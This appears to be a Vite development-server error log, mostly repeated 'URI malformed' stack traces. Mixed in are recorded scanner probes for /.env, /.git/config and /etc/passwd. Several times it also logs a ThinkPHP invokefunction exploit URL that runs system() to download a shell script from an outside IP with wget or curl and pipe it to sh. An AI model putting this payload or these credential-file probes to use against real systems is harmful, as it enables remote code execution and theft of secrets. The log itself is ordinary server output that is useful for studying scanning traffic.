      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh, use /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh.
7:18:39 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/client/planinfo, use /client/planinfo.
Files in the public directory are served at the root path.
Instead of /public/.env, use /.env.
12:43:47 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh, use /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh.
4:07:20 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
5:18:21 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/.git/config, use /.git/config.
8:16:24 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/client/planinfo, use /client/planinfo.
Files in the public directory are served at the root path.
Instead of /public/.env, use /.env.
Files in the public directory are served at the root path.
Instead of /public/.env, use /.env.
Files in the public directory are served at the root path.
Instead of /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh, use /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh.
3:24:57 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/.git/config, use /.git/config.
Files in the public directory are served at the root path.
Instead of /public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh, use /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=(wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||busybox wget -qO- http%3A%2F%2F74.194.191.52%2Frondo.txg.sh||curl -s http%3A%2F%2F74.194.191.52%2Frondo.txg.sh)|sh.
3:06:43 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/.git/config, use /.git/config.
3:51:43 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
7:29:10 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
11:16:53 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
The request url "/etc/passwd" is outside of Vite serving allow list.
4:05:55 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
5:17:13 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
9:29:15 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
12:28:42 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/.git/config, use /.git/config.
The request url "/?url=.env" is outside of Vite serving allow list.
12:03:54 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
The request url "/?url=.env" is outside of Vite serving allow list.
The request url "/etc/passwd" is outside of Vite serving allow list.
The request url "/etc/passwd" is outside of Vite serving allow list.
10:21:36 PM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
1:02:30 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
7:21:23 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
9:32:30 AM [vite] Internal server error: URI malformed
      at decodeURI (<anonymous>)
      at viteServeStaticMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35432:22)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteServeRawFsMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:35492:7)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
      at viteTransformMiddleware (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:37158:14)
      at call (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19166:7)
      at next (file:///root/cyto-app-main-80/frontend/node_modules/vite/dist/node/chunks/dep-DBxKXgDP.js:19110:5)
Files in the public directory are served at the root path.
Instead of /public/img/cz1.png, use /img/cz1.png.
Files in the public directory are served at the root path.
Instead of /public/js/global.js, use /js/global.js.
Files in the public directory are served at the root path.
Instead of /public/css/style.css, use /css/style.css.
Files in the public directory are served at the root path.
Instead of /public/wap/js/basis.js, use /wap/js/basis.js.
Files in the public directory are served at the root path.
Instead of /public/api/index/config, use /api/index/config.
Files in the public directory are served at the root path.
Instead of /public/h5static/js/main.js, use /h5static/js/main.js.
Files in the public directory are served at the root path.
Instead of /public/assets/js/lib/my-help.js, use /assets/js/lib/my-help.js.
Files in the public directory are served at the root path.
Instead of /public/assets/img/index/pay1.png, use /assets/img/index/pay1.png.
Files in the public directory are served at the root path.
Instead of /public/static/home/js/moblie/login.js, use /static/home/js/moblie/login.js.
Files in the public directory are served at the root path.
Instead of /public/static/index/picture/img_33.png, use /static/index/picture/img_33.png.
